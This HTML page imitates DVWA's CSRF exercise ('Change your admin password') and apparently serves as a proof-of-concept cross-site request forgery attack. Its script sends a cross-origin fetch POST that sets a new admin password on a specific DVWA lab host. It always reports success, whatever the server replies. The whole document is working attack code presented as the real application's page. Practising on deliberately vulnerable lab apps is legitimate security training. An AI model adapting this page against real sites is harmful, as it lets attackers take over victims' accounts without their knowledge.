<html lang="en-GB">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Damn Vulnerable Web Application (DVWA) Test Credentials</title>
    <link rel="stylesheet" type="text/css" href="../../dvwa/css/source.css">
    <link rel="icon" type="image/ico" href="../../favicon.ico">
</head>
<body>
    <div id="container">
        <div class="vulnerable_code_area">
            <h3>Change your admin password:</h3>
            <br>
            <div id="test_credentials">
                <button onclick="testFunct()">Test Credentials</button><br><br>
            </div>
            <br>
            <form id="passwordForm" onsubmit="changePassword(event)">
                New password:<br>
                <input type="password" autocomplete="off" id="password_new" name="password_new"><br>
                Confirm new password:<br>
                <input type="password" autocomplete="off" id="password_conf" name="password_conf"><br>
                <br>
                <input type="submit" value="Change" name="Change">
            </form>
            <pre id="result"></pre>
        </div>
    </div>

    <script>
        function testFunct() {
            window.open("https://lab-2105cf46-fd70-4e4b-8ece-4494323c5240.australiaeast.cloudapp.azure.com:7042/DVWA/vulnerabilities/csrf/test_credentials.php", "_blank", 
            "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=600,height=400");
        }

        function changePassword(event) {
            event.preventDefault(); // Prevent the form from submitting the default way

            // Get the form data
            var newPassword = document.getElementById('password_new').value;
            var confirmPassword = document.getElementById('password_conf').value;

            // Make sure the passwords match
            if (newPassword !== confirmPassword) {
                document.getElementById('result').textContent = "Passwords do not match!";
                return;
            }

            // Create the request payload
            var formData = new URLSearchParams();
            formData.append('password_new', newPassword);
            formData.append('password_conf', confirmPassword);
            formData.append('Change', 'Change');

            // Send the request using fetch API
            fetch('https://lab-2105cf46-fd70-4e4b-8ece-4494323c5240.australiaeast.cloudapp.azure.com:7042/DVWA/vulnerabilities/csrf/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: formData.toString()
            })
            .then(response => response.text())  // Parse the response as text
            .then(data => {
                // Display the result
                document.getElementById('result').textContent = "Password changed successfully.";
            })
            .catch(error => {
                document.getElementById('result').textContent = "Error changing password.";
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
